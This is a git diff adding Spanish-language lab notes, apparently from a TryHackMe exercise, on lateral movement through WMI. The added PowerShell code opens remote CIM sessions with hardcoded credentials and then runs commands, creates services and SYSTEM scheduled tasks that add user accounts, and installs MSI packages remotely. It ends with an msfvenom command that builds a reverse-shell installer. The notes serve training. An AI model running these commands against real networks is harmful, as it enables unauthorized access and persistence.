@@ -118,6 +118,111 @@ schtasks /S TARGET /TN "THMtask1" /DELETE /F
 
 # Movimiento lateras usando WMI
 
+WMI (Windows Management Instrumentation)
+
+WBEM (Web-Based enterprise Management)
+
+En términos simples, WMI administra las tareas que los atacante vas a utilizar para hacer movimiento lateral
+
+## Conectar con WMI por PowerShell
+
+Antes de entablar connexión con Powershell, necesitaremos crear un objeto con usuario y contraseñas. Este objeto se guarda como variable $credential
+
+```
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+Cuando procedamos a entablar la sesión debemos seguir estos protocolos:
+
+- DCOM : RCP a la IP para una conexión por WMI. Por el protocolo 135 usando sc.exe
+- Wsmam: WinRM puede ser usada con WMI. El protocolo es el 5985
+
+Para entablar con Porwersell podemos guardar los comandos con la variable $session
+
+```
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+Invocar Powershell
+
+```
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+```
+
+## Crear servicios con WMI
+
+Podemos crear servicios con la powershell
+
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "THMService2";
+DisplayName = "THMService2";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+```
+
+Podemos controlar el servicio o oiniciarlo:
+
+```
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+```
+
+```
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+
+## Crear una tarea remotamente
+
+Podemos ejecutar tareas usando los comandos por defecto 
+
+```
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+BOrrar tarea:
+
+```
+
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+## Instalar paquetes MSI con WMI
+
+# Requiere admin
+
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
+
+# Ejemplo:
+
+para añadir a nuestro el dominio a nuestra red deberemos irnos a resolv.conf y cambiar el dns
+
+Nos conectamos con una  shell (generamos una)
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
+```
+
+
 
 
 
